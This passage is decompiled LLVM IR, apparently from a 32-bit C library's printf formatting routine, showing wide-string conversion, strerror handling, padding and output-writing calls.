  %v0_804e7b6 = load i32, i32* @esi, align 4
  %v2_804e7b6 = add i32 %v0_804e604.lcssa, -8
  %v3_804e7b6 = inttoptr i32 %v2_804e7b6 to i32*
  store i32 %v0_804e7b6, i32* %v3_804e7b6, align 4
  %v1_804e7b7 = add i32 %v0_804e604.lcssa, -12
  %v2_804e7b7 = inttoptr i32 %v1_804e7b7 to i32*
  store i32 134538362, i32* %v2_804e7b7, align 4
  %v1_804e7bc = add i32 %v0_804e604.lcssa, 20
  store i32 %v1_804e7bc, i32* %eax.global-to-local, align 4
  %v2_804e7c0 = add i32 %v0_804e604.lcssa, -16
  %v3_804e7c0 = inttoptr i32 %v2_804e7c0 to i32*
  store i32 %v1_804e7bc, i32* %v3_804e7c0, align 4
  %v1_804e7c1 = add i32 %v0_804e604.lcssa, -28
  %v1_804e7c4 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804e7c4 = inttoptr i32 %v1_804e7c1 to x86_fp80*
  store x86_fp80 %v1_804e7c4, x86_fp80* %v3_804e7c4, align 4
  %v1_804e7c7 = add i32 %v0_804e604.lcssa, 368
  %v2_804e7c7 = inttoptr i32 %v1_804e7c7 to i32*
  %v3_804e7c7 = load i32, i32* %v2_804e7c7, align 4
  %v5_804e7c7 = add i32 %v0_804e604.lcssa, -32
  %v6_804e7c7 = inttoptr i32 %v5_804e7c7 to i32*
  store i32 %v3_804e7c7, i32* %v6_804e7c7, align 4
  %v0_804e7ce = call i32 @_fpmaxtostr()
  store i32 %v0_804e7ce, i32* %eax.global-to-local, align 4
  %v0_804e7d3 = load i32, i32* @esp, align 4
  %v1_804e7d3 = add i32 %v0_804e7d3, 32
  %v2_804e7d6 = icmp slt i32 %v0_804e7ce, 0
  br i1 %v2_804e7d6, label %dec_label_pc_804ea77, label %dec_label_pc_804e7de

dec_label_pc_804e7de:                             ; preds = %dec_label_pc_804e7b5
  %v1_804e7de = inttoptr i32 %v1_804e7d3 to i32*
  %v2_804e7de = load i32, i32* %v1_804e7de, align 4
  %v4_804e7de = add i32 %v2_804e7de, %v0_804e7ce
  store i32 %v4_804e7de, i32* %v1_804e7de, align 4
  %v0_804ea64.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ea64

dec_label_pc_804e7e6:                             ; preds = %dec_label_pc_804e79c
  %tmp100 = or i32 %v3_804e604, 1
  %tmp101 = icmp eq i32 %tmp100, 17
  br i1 %tmp101, label %dec_label_pc_804e7ef, label %dec_label_pc_804e882

dec_label_pc_804e7ef:                             ; preds = %dec_label_pc_804e7e6
  %v9_804e7e6 = icmp eq i32 %v3_804e604, 17
  %v1_804e7ef = add i32 %v0_804e604.lcssa, 332
  %v2_804e7ef = inttoptr i32 %v1_804e7ef to i32*
  store i32 0, i32* %v2_804e7ef, align 4
  %v0_804e7fa = load i32, i32* @esp, align 4
  %v1_804e7fa = add i32 %v0_804e7fa, 344
  %v2_804e7fa = inttoptr i32 %v1_804e7fa to i32*
  %v3_804e7fa = load i32, i32* %v2_804e7fa, align 4
  store i32 %v3_804e7fa, i32* %edx.global-to-local, align 4
  %v1_804e801 = icmp eq i1 %v9_804e7e6, false
  br i1 %v1_804e801, label %dec_label_pc_804e84d, label %dec_label_pc_804e803

dec_label_pc_804e803:                             ; preds = %dec_label_pc_804e7ef
  %v1_804e803 = inttoptr i32 %v3_804e7fa to i32*
  %v2_804e803 = load i32, i32* %v1_804e803, align 4
  store i32 %v2_804e803, i32* %eax.global-to-local, align 4
  %v2_804e805 = add i32 %v0_804e7fa, 340
  %v3_804e805 = inttoptr i32 %v2_804e805 to i32*
  store i32 %v2_804e803, i32* %v3_804e805, align 4
  %v0_804e80c = load i32, i32* %eax.global-to-local, align 4
  %v1_804e80c = icmp eq i32 %v0_804e80c, 0
  br i1 %v1_804e80c, label %dec_label_pc_804e900, label %dec_label_pc_804e814

dec_label_pc_804e814:                             ; preds = %dec_label_pc_804e803
  %v0_804e814 = load i32, i32* @esp, align 4
  %v1_804e814 = add i32 %v0_804e814, 20
  %v2_804e814 = inttoptr i32 %v1_804e814 to i32*
  %v3_804e814 = load i32, i32* %v2_804e814, align 4
  store i32 %v3_804e814, i32* %eax.global-to-local, align 4
  %v2_804e81b = icmp slt i32 %v3_804e814, 0
  br i1 %v2_804e81b, label %dec_label_pc_804e821, label %dec_label_pc_804e81f

dec_label_pc_804e81f:                             ; preds = %dec_label_pc_804e814
  br label %dec_label_pc_804e821

dec_label_pc_804e821:                             ; preds = %dec_label_pc_804e814, %dec_label_pc_804e81f
  %storemerge105 = phi i32 [ %v3_804e814, %dec_label_pc_804e81f ], [ -1, %dec_label_pc_804e814 ]
  store i32 %storemerge105, i32* %ecx.global-to-local, align 4
  %v1_804e821 = add i32 %v0_804e814, 340
  store i32 %v1_804e821, i32* %edx.global-to-local, align 4
  %v1_804e828 = add i32 %v0_804e814, 332
  store i32 %v1_804e828, i32* %eax.global-to-local, align 4
  %v2_804e82f = add i32 %v0_804e814, -4
  %v3_804e82f = inttoptr i32 %v2_804e82f to i32*
  store i32 %v1_804e828, i32* %v3_804e82f, align 4
  %v0_804e830 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e830 = add i32 %v0_804e814, -8
  %v3_804e830 = inttoptr i32 %v2_804e830 to i32*
  store i32 %v0_804e830, i32* %v3_804e830, align 4
  %v0_804e831 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e831 = add i32 %v0_804e814, -12
  %v3_804e831 = inttoptr i32 %v2_804e831 to i32*
  store i32 %v0_804e831, i32* %v3_804e831, align 4
  %v0_804e832 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e832 = add i32 %v0_804e814, -16
  %v3_804e832 = inttoptr i32 %v2_804e832 to i32*
  store i32 %v0_804e832, i32* %v3_804e832, align 4
  %v0_804e833 = call i32 @__GI_wcsrtombs()
  store i32 %v0_804e833, i32* %eax.global-to-local, align 4
  %v0_804e838 = load i32, i32* @esp, align 4
  %v1_804e838 = add i32 %v0_804e838, 16
  store i32 %v0_804e833, i32* @esi, align 4
  %v10_804e83d = icmp eq i32 %v0_804e833, -1
  br i1 %v10_804e83d, label %dec_label_pc_804ea77, label %dec_label_pc_804e846

dec_label_pc_804e846:                             ; preds = %dec_label_pc_804e821
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804e90a

dec_label_pc_804e84d:                             ; preds = %dec_label_pc_804e7ef
  %v0_804e84d = load i32, i32* @ebx, align 4
  %v2_804e84d = add i32 %v0_804e7fa, -4
  %v3_804e84d = inttoptr i32 %v2_804e84d to i32*
  store i32 %v0_804e84d, i32* %v3_804e84d, align 4
  %v1_804e84e = add i32 %v0_804e7fa, 332
  store i32 %v1_804e84e, i32* %eax.global-to-local, align 4
  %v2_804e855 = add i32 %v0_804e7fa, -8
  %v3_804e855 = inttoptr i32 %v2_804e855 to i32*
  store i32 %v1_804e84e, i32* %v3_804e855, align 4
  %v0_804e856 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e856 = inttoptr i32 %v0_804e856 to i32*
  %v2_804e856 = load i32, i32* %v1_804e856, align 4
  %v4_804e856 = add i32 %v0_804e7fa, -12
  %v5_804e856 = inttoptr i32 %v4_804e856 to i32*
  store i32 %v2_804e856, i32* %v5_804e856, align 4
  %v1_804e858 = add i32 %v0_804e7fa, 204
  store i32 %v1_804e858, i32* @ebx, align 4
  %v2_804e85f = add i32 %v0_804e7fa, -16
  %v3_804e85f = inttoptr i32 %v2_804e85f to i32*
  store i32 %v1_804e858, i32* %v3_804e85f, align 4
  %v0_804e860 = call i32 @__GI_wcrtomb()
  store i32 %v0_804e860, i32* %eax.global-to-local, align 4
  %v0_804e865 = load i32, i32* @esp, align 4
  %v1_804e865 = add i32 %v0_804e865, 16
  store i32 %v0_804e860, i32* @esi, align 4
  %v10_804e86a = icmp eq i32 %v0_804e860, -1
  br i1 %v10_804e86a, label %dec_label_pc_804ea77, label %dec_label_pc_804e873

dec_label_pc_804e873:                             ; preds = %dec_label_pc_804e84d
  %v0_804e873 = load i32, i32* @ebx, align 4
  store i32 %v0_804e873, i32* @edi, align 4
  %v2_804e875 = add i32 %v0_804e860, 220
  %v3_804e875 = add i32 %v2_804e875, %v0_804e865
  %v4_804e875 = inttoptr i32 %v3_804e875 to i8*
  store i8 0, i8* %v4_804e875, align 1
  br label %dec_label_pc_804e90a

dec_label_pc_804e882:                             ; preds = %dec_label_pc_804e7e6
  %tmp102 = icmp ult i32 %v3_804e604, 20
  br i1 %tmp102, label %dec_label_pc_804e887, label %dec_label_pc_804e8d2

dec_label_pc_804e887:                             ; preds = %dec_label_pc_804e882
  %v9_804e882 = icmp eq i32 %v3_804e604, 19
  %v1_804e887 = add i32 %v0_804e604.lcssa, 344
  %v2_804e887 = inttoptr i32 %v1_804e887 to i32*
  %v3_804e887 = load i32, i32* %v2_804e887, align 4
  store i32 %v3_804e887, i32* %edx.global-to-local, align 4
  %v1_804e88e = icmp eq i1 %v9_804e882, false
  %v1_804e8b3 = inttoptr i32 %v3_804e887 to i32*
  %v2_804e8b3 = load i32, i32* %v1_804e8b3, align 4
  br i1 %v1_804e88e, label %dec_label_pc_804e8b3, label %dec_label_pc_804e890

dec_label_pc_804e890:                             ; preds = %dec_label_pc_804e887
  store i32 %v2_804e8b3, i32* @edi, align 4
  %v1_804e892 = icmp eq i32 %v2_804e8b3, 0
  br i1 %v1_804e892, label %dec_label_pc_804e900, label %dec_label_pc_804e896

dec_label_pc_804e896:                             ; preds = %dec_label_pc_804e890, %dec_label_pc_804e8db
  %v1_804e8a3 = phi i32 [ %v0_804e604.lcssa, %dec_label_pc_804e890 ], [ %v1_804e8f5, %dec_label_pc_804e8db ]
  %v1_804e896 = add i32 %v1_804e8a3, 20
  %v2_804e896 = inttoptr i32 %v1_804e896 to i32*
  %v3_804e896 = load i32, i32* %v2_804e896, align 4
  store i32 %v3_804e896, i32* %eax.global-to-local, align 4
  %v2_804e89d = icmp slt i32 %v3_804e896, 0
  br i1 %v2_804e89d, label %dec_label_pc_804e8a3, label %dec_label_pc_804e8a1

dec_label_pc_804e8a1:                             ; preds = %dec_label_pc_804e896
  br label %dec_label_pc_804e8a3

dec_label_pc_804e8a3:                             ; preds = %dec_label_pc_804e896, %dec_label_pc_804e8a1
  %storemerge = phi i32 [ %v3_804e896, %dec_label_pc_804e8a1 ], [ -1, %dec_label_pc_804e896 ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_804e8a3 = add i32 %v1_804e8a3, -4
  %v3_804e8a3 = inttoptr i32 %v2_804e8a3 to i32*
  store i32 %v3_804e604, i32* %v3_804e8a3, align 4
  %v2_804e8a4 = add i32 %v1_804e8a3, -8
  %v3_804e8a4 = inttoptr i32 %v2_804e8a4 to i32*
  store i32 %v3_804e604, i32* %v3_804e8a4, align 4
  %v0_804e8a5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e8a5 = add i32 %v1_804e8a3, -12
  %v3_804e8a5 = inttoptr i32 %v2_804e8a5 to i32*
  store i32 %v0_804e8a5, i32* %v3_804e8a5, align 4
  %v0_804e8a6 = load i32, i32* @edi, align 4
  %v2_804e8a6 = add i32 %v1_804e8a3, -16
  %v3_804e8a6 = inttoptr i32 %v2_804e8a6 to i32*
  store i32 %v0_804e8a6, i32* %v3_804e8a6, align 4
  %v0_804e8a7 = call i32 @strnlen()
  store i32 %v0_804e8a7, i32* %eax.global-to-local, align 4
  store i32 %v0_804e8a7, i32* @esi, align 4
  br label %dec_label_pc_804e90a

dec_label_pc_804e8b3:                             ; preds = %dec_label_pc_804e887
  store i32 %v2_804e8b3, i32* %eax.global-to-local, align 4
  %v1_804e8b5 = add i32 %v0_804e604.lcssa, 204
  store i32 %v1_804e8b5, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  %v1_804e8c1 = trunc i32 %v2_804e8b3 to i8
  %v4_804e8c1 = inttoptr i32 %v1_804e8b5 to i8*
  store i8 %v1_804e8c1, i8* %v4_804e8c1, align 1
  %v0_804e8c8 = load i32, i32* @esp, align 4
  %v1_804e8c8 = add i32 %v0_804e8c8, 205
  %v2_804e8c8 = inttoptr i32 %v1_804e8c8 to i8*
  store i8 0, i8* %v2_804e8c8, align 1
  br label %dec_label_pc_804e90a

dec_label_pc_804e8d2:                             ; preds = %dec_label_pc_804e882
  %v9_804e8d2 = icmp eq i32 %v3_804e604, 20
  %v1_804e8d5 = icmp eq i1 %v9_804e8d2, false
  br i1 %v1_804e8d5, label %dec_label_pc_804ea77, label %dec_label_pc_804e8db

dec_label_pc_804e8db:                             ; preds = %dec_label_pc_804e8d2
  %v0_804e8db = load i32, i32* %stack_var_-364, align 4
  %v1_804e8db = call i32 @__errno_location(i32 %v0_804e8db)
  store i32 %v1_804e8db, i32* %eax.global-to-local, align 4
  %v0_804e8e0 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e8e0 = load i32, i32* @esp, align 4
  %v2_804e8e0 = add i32 %v1_804e8e0, -4
  %v3_804e8e0 = inttoptr i32 %v2_804e8e0 to i32*
  store i32 %v0_804e8e0, i32* %v3_804e8e0, align 4
  %v1_804e8e1 = add i32 %v1_804e8e0, -8
  %v2_804e8e1 = inttoptr i32 %v1_804e8e1 to i32*
  store i32 128, i32* %v2_804e8e1, align 4
  %v1_804e8e6 = add i32 %v1_804e8e0, 204
  store i32 %v1_804e8e6, i32* %edx.global-to-local, align 4
  %v2_804e8ed = add i32 %v1_804e8e0, -12
  %v3_804e8ed = inttoptr i32 %v2_804e8ed to i32*
  store i32 %v1_804e8e6, i32* %v3_804e8ed, align 4
  %v1_804e8ee = inttoptr i32 %v1_804e8db to i32*
  %v2_804e8ee = load i32, i32* %v1_804e8ee, align 4
  %v4_804e8ee = add i32 %v1_804e8e0, -16
  %v5_804e8ee = inttoptr i32 %v4_804e8ee to i32*
  store i32 %v2_804e8ee, i32* %v5_804e8ee, align 4
  %v0_804e8f0 = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_804e8f0, i32* %eax.global-to-local, align 4
  %v0_804e8f5 = load i32, i32* @esp, align 4
  %v1_804e8f5 = add i32 %v0_804e8f5, 16
  store i32 %v0_804e8f0, i32* @edi, align 4
  br label %dec_label_pc_804e896

dec_label_pc_804e8fc:                             ; preds = %dec_label_pc_804e78b, %dec_label_pc_804e784, %dec_label_pc_804e771
  %v0_804e91637 = phi i32 [ %v1_804e717, %dec_label_pc_804e78b ], [ 0, %dec_label_pc_804e784 ], [ 5, %dec_label_pc_804e771 ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804e916

dec_label_pc_804e900:                             ; preds = %dec_label_pc_804e890, %dec_label_pc_804e803
  store i32 ptrtoint ([7 x i8]* @global_var_805317e.103 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_804e90a

dec_label_pc_804e90a:                             ; preds = %dec_label_pc_804e8b3, %dec_label_pc_804e8a3, %dec_label_pc_804e873, %dec_label_pc_804e846, %dec_label_pc_804e900
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_804e911 = load i32, i32* @esp, align 4
  %v1_804e911 = add i32 %v0_804e911, 7
  %v2_804e911 = inttoptr i32 %v1_804e911 to i8*
  store i8 32, i8* %v2_804e911, align 1
  %v0_804e916.pre = load i32, i32* @esi, align 4
  %v1_804e916.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e916

dec_label_pc_804e916:                             ; preds = %dec_label_pc_804e8fc, %dec_label_pc_804e793, %dec_label_pc_804e90a
  %v1_804e916 = phi i32 [ 0, %dec_label_pc_804e8fc ], [ %v2_804e78b, %dec_label_pc_804e793 ], [ %v1_804e916.pre, %dec_label_pc_804e90a ]
  %v0_804e916 = phi i32 [ %v0_804e91637, %dec_label_pc_804e8fc ], [ %v1_804e717, %dec_label_pc_804e793 ], [ %v0_804e916.pre, %dec_label_pc_804e90a ]
  %v2_804e916 = add i32 %v0_804e916, %v1_804e916
  store i32 %v2_804e916, i32* @edx, align 4
  %v0_804e919 = load i32, i32* @ebp, align 4
  %v9_804e919 = icmp eq i32 %v0_804e919, 11
  br i1 %v9_804e919, label %dec_label_pc_804e92a, label %dec_label_pc_804e91e

dec_label_pc_804e91e:                             ; preds = %dec_label_pc_804e916
  %v1_804e920 = add i32 %v0_804e919, -5
  %v6_804e920 = sub i32 4, %v0_804e919
  %v7_804e920 = and i32 %v6_804e920, %v0_804e919
  %v8_804e920 = icmp slt i32 %v7_804e920, 0
  %v9_804e920 = icmp eq i32 %v1_804e920, 0
  %v10_804e920 = icmp slt i32 %v1_804e920, 0
  %v3_804e923 = icmp eq i1 %v10_804e920, %v8_804e920
  %v4_804e923 = icmp eq i1 %v9_804e920, false
  %v5_804e923 = and i1 %v4_804e923, %v3_804e923
  %v6_804e923 = zext i1 %v5_804e923 to i32
  store i32 %v6_804e923, i32* %eax.global-to-local, align 4
  %v2_804e926 = add i32 %v2_804e916, 1
  %v3_804e926 = add i32 %v2_804e926, %v6_804e923
  store i32 %v3_804e926, i32* @edx, align 4
  br label %dec_label_pc_804e92a

dec_label_pc_804e92a:                             ; preds = %dec_label_pc_804e916, %dec_label_pc_804e91e
  %v0_804e92a = load i32, i32* @esp, align 4
  %v1_804e92a = add i32 %v0_804e92a, 24
  %v2_804e92a = inttoptr i32 %v1_804e92a to i32*
  %v3_804e92a = load i32, i32* %v2_804e92a, align 4
  store i32 %v3_804e92a, i32* %eax.global-to-local, align 4
  %v1_804e92e = add i32 %v0_804e92a, 8
  %v2_804e92e = inttoptr i32 %v1_804e92e to i32*
  store i32 0, i32* %v2_804e92e, align 4
  %v0_804e936 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e936 = load i32, i32* @edx, align 4
  %v2_804e936 = sub i32 %v0_804e936, %v1_804e936
  %v7_804e936 = icmp ult i32 %v0_804e936, %v1_804e936
  %v12_804e936 = icmp eq i32 %v2_804e936, 0
  %v2_804e938 = or i1 %v7_804e936, %v12_804e936
  br i1 %v2_804e938, label %dec_label_pc_804e940, label %dec_label_pc_804e93a

dec_label_pc_804e93a:                             ; preds = %dec_label_pc_804e92a
  store i32 %v2_804e936, i32* %eax.global-to-local, align 4
  %v1_804e93c = load i32, i32* @esp, align 4
  %v2_804e93c = add i32 %v1_804e93c, 8
  %v3_804e93c = inttoptr i32 %v2_804e93c to i32*
  store i32 %v2_804e936, i32* %v3_804e93c, align 4
  %v0_804e944.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e940

dec_label_pc_804e940:                             ; preds = %dec_label_pc_804e92a, %dec_label_pc_804e93a
  %v0_804e944 = phi i32 [ %v1_804e936, %dec_label_pc_804e92a ], [ %v0_804e944.pre, %dec_label_pc_804e93a ]
  %v0_804e940 = load i32, i32* @esp, align 4
  %v1_804e940 = add i32 %v0_804e940, 8
  %v2_804e940 = inttoptr i32 %v1_804e940 to i32*
  %v3_804e940 = load i32, i32* %v2_804e940, align 4
  store i32 %v3_804e940, i32* @ecx, align 4
  %v2_804e944 = add i32 %v3_804e940, %v0_804e944
  store i32 %v2_804e944, i32* %eax.global-to-local, align 4
  %v1_804e947 = inttoptr i32 %v0_804e940 to i32*
  %v2_804e947 = load i32, i32* %v1_804e947, align 4
  %v4_804e947 = add i32 %v2_804e947, %v2_804e944
  store i32 %v4_804e947, i32* %v1_804e947, align 4
  %v0_804e94a = load i32, i32* @esp, align 4
  %v1_804e94a = add i32 %v0_804e94a, 7
  %v2_804e94a = inttoptr i32 %v1_804e94a to i8*
  %v3_804e94a = load i8, i8* %v2_804e94a, align 1
  %v9_804e94a = icmp eq i8 %v3_804e94a, 48
  %v1_804e94f = icmp eq i1 %v9_804e94a, false
  br i1 %v1_804e94f, label %dec_label_pc_804e95b, label %dec_label_pc_804e951

dec_label_pc_804e951:                             ; preds = %dec_label_pc_804e940
  %v0_804e951 = load i32, i32* @ebx, align 4
  %v1_804e951 = load i32, i32* @ecx, align 4
  %v2_804e951 = add i32 %v1_804e951, %v0_804e951
  store i32 %v2_804e951, i32* @ebx, align 4
  %v1_804e953 = add i32 %v0_804e94a, 8
  %v2_804e953 = inttoptr i32 %v1_804e953 to i32*
  store i32 0, i32* %v2_804e953, align 4
  %v0_804e95b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e95b

dec_label_pc_804e95b:                             ; preds = %dec_label_pc_804e940, %dec_label_pc_804e951
  %v0_804e962 = phi i32 [ %v0_804e94a, %dec_label_pc_804e940 ], [ %v0_804e95b.pre, %dec_label_pc_804e951 ]
  %v1_804e95b = add i32 %v0_804e962, 32
  %v2_804e95b = inttoptr i32 %v1_804e95b to i8*
  %v3_804e95b = load i8, i8* %v2_804e95b, align 1
  %v4_804e95b = and i8 %v3_804e95b, 8
  %v5_804e95b = icmp eq i8 %v4_804e95b, 0
  %v1_804e960 = icmp eq i1 %v5_804e95b, false
  br i1 %v1_804e960, label %dec_label_pc_804e989, label %dec_label_pc_804e962

dec_label_pc_804e962:                             ; preds = %dec_label_pc_804e95b
  %v1_804e962 = add i32 %v0_804e962, 8
  %v2_804e962 = inttoptr i32 %v1_804e962 to i32*
  %v3_804e962 = load i32, i32* %v2_804e962, align 4
  store i32 %v3_804e962, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804e96b = add i32 %v0_804e962, 368
  %v2_804e96b = inttoptr i32 %v1_804e96b to i32*
  %v3_804e96b = load i32, i32* %v2_804e96b, align 4
  store i32 %v3_804e96b, i32* @eax, align 4
  %v0_804e972 = call i32 @_charpad()
  store i32 %v0_804e972, i32* %eax.global-to-local, align 4
  %v1_804e977 = load i32, i32* @esp, align 4
  %v2_804e977 = add i32 %v1_804e977, 8
  %v3_804e977 = inttoptr i32 %v2_804e977 to i32*
  %v4_804e977 = load i32, i32* %v3_804e977, align 4
  %v15_804e977 = icmp eq i32 %v0_804e972, %v4_804e977
  %v1_804e97b = icmp eq i1 %v15_804e977, false
  br i1 %v1_804e97b, label %dec_label_pc_804ea77, label %dec_label_pc_804e981

dec_label_pc_804e981:                             ; preds = %dec_label_pc_804e962
  store i32 0, i32* %v3_804e977, align 4
  %v1_804e989.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e989

dec_label_pc_804e989:                             ; preds = %dec_label_pc_804e95b, %dec_label_pc_804e981
  %v1_804e989 = phi i32 [ %v0_804e962, %dec_label_pc_804e95b ], [ %v1_804e989.pre, %dec_label_pc_804e981 ]
  %v0_804e989 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e989 = add i32 %v1_804e989, -4
  %v3_804e989 = inttoptr i32 %v2_804e989 to i32*
  store i32 %v0_804e989, i32* %v3_804e989, align 4
  %v0_804e98a = load i32, i32* %eax.global-to-local, align 4
  %v2_804e98a = add i32 %v1_804e989, -8
  %v3_804e98a = inttoptr i32 %v2_804e98a to i32*
  store i32 %v0_804e98a, i32* %v3_804e98a, align 4
  %v1_804e98b = add i32 %v1_804e989, 368
  %v2_804e98b = inttoptr i32 %v1_804e98b to i32*
  %v3_804e98b = load i32, i32* %v2_804e98b, align 4
  %v5_804e98b = add i32 %v1_804e989, -12
  %v6_804e98b = inttoptr i32 %v5_804e98b to i32*
  store i32 %v3_804e98b, i32* %v6_804e98b, align 4
  %v0_804e992 = load i32, i32* @ebp, align 4
  %v1_804e992 = add i32 %v0_804e992, ptrtoint (i32* @global_var_8053185.104 to i32)
  store i32 %v1_804e992, i32* %eax.global-to-local, align 4
  %v2_804e998 = add i32 %v1_804e989, -16
  %v3_804e998 = inttoptr i32 %v2_804e998 to i32*
  store i32 %v1_804e992, i32* %v3_804e998, align 4
  %v0_804e999 = load i32, i32* %stack_var_-364, align 4
  %v4_804e999 = inttoptr i32 %v0_804e999 to i8*
  %v5_804e999 = call i32 @__GI_fputs_unlocked(i8* %v4_804e999, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804e999, i32* %eax.global-to-local, align 4
  %v0_804e99e = load i32, i32* @esp, align 4
  %v1_804e99e = add i32 %v0_804e99e, 384
  %v2_804e99e = inttoptr i32 %v1_804e99e to i32*
  %v3_804e99e = load i32, i32* %v2_804e99e, align 4
  store i32 %v3_804e99e, i32* @eax, align 4
  %v0_804e9a5 = load i32, i32* @ebx, align 4
  store i32 %v0_804e9a5, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804e9ac = call i32 @_charpad()
  store i32 %v0_804e9ac, i32* %eax.global-to-local, align 4
  %v0_804e9b1 = load i32, i32* @esp, align 4
  %v1_804e9b1 = add i32 %v0_804e9b1, 16
  %v1_804e9b4 = load i32, i32* @ebx, align 4
  %v12_804e9b4 = icmp eq i32 %v0_804e9ac, %v1_804e9b4
  %v1_804e9b6 = icmp eq i1 %v12_804e9b4, false
  br i1 %v1_804e9b6, label %dec_label_pc_804ea77, label %dec_label_pc_804e9bc

dec_label_pc_804e9bc:                             ; preds = %dec_label_pc_804e989
  %v1_804e9bc = add i32 %v0_804e9b1, 356
  %v2_804e9bc = inttoptr i32 %v1_804e9bc to i32*
  %v3_804e9bc = load i32, i32* %v2_804e9bc, align 4
  %v4_804e9bc = icmp eq i32 %v3_804e9bc, 0
  %v1_804e9c4 = icmp eq i1 %v4_804e9bc, false
  br i1 %v1_804e9c4, label %dec_label_pc_804e9e8, label %dec_label_pc_804e9c6

dec_label_pc_804e9c6:                             ; preds = %dec_label_pc_804e9bc
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804e9c8 = load i32, i32* @esi, align 4
  %v1_804e9c8 = icmp eq i32 %v0_804e9c8, 0
  br i1 %v1_804e9c8, label %dec_label_pc_804e9de.thread, label %dec_label_pc_804e9de

dec_label_pc_804e9de.thread:                      ; preds = %dec_label_pc_804e9c6
  br label %dec_label_pc_804ea49

dec_label_pc_804e9de:                             ; preds = %dec_label_pc_804e9c6
  %v2_804e9cc = add i32 %v0_804e9b1, 12
  %v3_804e9cc = inttoptr i32 %v2_804e9cc to i32*
  store i32 0, i32* %v3_804e9cc, align 4
  %v1_804e9cd = add i32 %v0_804e9b1, 384
  %v2_804e9cd = inttoptr i32 %v1_804e9cd to i32*
  %v3_804e9cd = load i32, i32* %v2_804e9cd, align 4
  %v5_804e9cd = add i32 %v0_804e9b1, 8
  %v6_804e9cd = inttoptr i32 %v5_804e9cd to i32*
  store i32 %v3_804e9cd, i32* %v6_804e9cd, align 4
  %v0_804e9d4 = load i32, i32* @esi, align 4
  %v2_804e9d4 = add i32 %v0_804e9b1, 4
  %v3_804e9d4 = inttoptr i32 %v2_804e9d4 to i32*
  store i32 %v0_804e9d4, i32* %v3_804e9d4, align 4
  %v0_804e9d5 = load i32, i32* @edi, align 4
  %v3_804e9d5 = inttoptr i32 %v0_804e9b1 to i32*
  store i32 %v0_804e9d5, i32* %v3_804e9d5, align 4
  %v0_804e9d6 = load i32, i32* %stack_var_-364, align 4
  %v4_804e9d6 = call i32 @__stdio_fwrite(i32 %v0_804e9d6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e9d6, i32* %eax.global-to-local, align 4
  %v0_804e9db = load i32, i32* @esp, align 4
  %v1_804e9db = add i32 %v0_804e9db, 16
  %v1_804e9de.pre = load i32, i32* @esi, align 4
  %v12_804e9de = icmp eq i32 %v4_804e9d6, %v1_804e9de.pre
  %v1_804e9e0 = icmp eq i1 %v12_804e9de, false
  br i1 %v1_804e9e0, label %dec_label_pc_804ea77, label %dec_label_pc_804ea49

dec_label_pc_804e9e8:                             ; preds = %dec_label_pc_804e9bc
  %v1_804e9e8 = add i32 %v0_804e9b1, 348
  %v2_804e9e8 = inttoptr i32 %v1_804e9e8 to i32*
  store i32 0, i32* %v2_804e9e8, align 4
  %v0_804ea458 = load i32, i32* @esi, align 4
  %v1_804ea459 = icmp eq i32 %v0_804ea458, 0
  %v1_804ea4716 = icmp eq i1 %v1_804ea459, false
  br i1 %v1_804ea4716, label %dec_label_pc_804e9f5, label %dec_label_pc_804e9e8.dec_label_pc_804ea49.loopexit_crit_edge

dec_label_pc_804e9e8.dec_label_pc_804ea49.loopexit_crit_edge: ; preds = %dec_label_pc_804e9e8
  %v0_804ea49.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ea49

dec_label_pc_804e9f5:                             ; preds = %dec_label_pc_804e9e8, %dec_label_pc_804ea43
  %v0_804e9f5 = phi i32 [ %v2_804ea43, %dec_label_pc_804ea43 ], [ %v0_804ea458, %dec_label_pc_804e9e8 ]
  %tmp103 = icmp ult i32 %v0_804e9f5, 129
  br i1 %tmp103, label %dec_label_pc_804ea04, label %dec_label_pc_804e9ff

dec_label_pc_804e9ff:                             ; preds = %dec_label_pc_804e9f5
  br label %dec_label_pc_804ea04

dec_label_pc_804ea04:                             ; preds = %dec_label_pc_804e9f5, %dec_label_pc_804e9ff
  %storemerge104 = phi i32 [ 128, %dec_label_pc_804e9ff ], [ %v0_804e9f5, %dec_label_pc_804e9f5 ]
  store i32 %storemerge104, i32* %edx.global-to-local, align 4
  %v0_804ea04 = load i32, i32* @esp, align 4
  %v1_804ea04 = add i32 %v0_804ea04, 332
  %v2_804ea0b = add i32 %v0_804ea04, -4
  %v3_804ea0b = inttoptr i32 %v2_804ea0b to i32*
  store i32 %v1_804ea04, i32* %v3_804ea0b, align 4
  %v0_804ea0c = load i32, i32* %edx.global-to-local, align 4
  %v2_804ea0c = add i32 %v0_804ea04, -8
  %v3_804ea0c = inttoptr i32 %v2_804ea0c to i32*
  store i32 %v0_804ea0c, i32* %v3_804ea0c, align 4
  %v1_804ea0d = add i32 %v0_804ea04, 340
